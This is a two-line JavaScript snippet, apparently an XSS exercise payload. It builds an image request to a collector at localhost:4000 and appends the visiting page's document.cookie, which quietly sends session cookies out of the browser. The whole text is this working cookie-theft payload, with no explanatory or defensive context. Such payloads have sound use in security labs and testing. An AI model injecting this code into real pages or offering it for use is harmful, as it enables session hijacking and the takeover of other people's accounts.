var img = new Image()
img.src='http://localhost:4000/img?c='+document.cookie

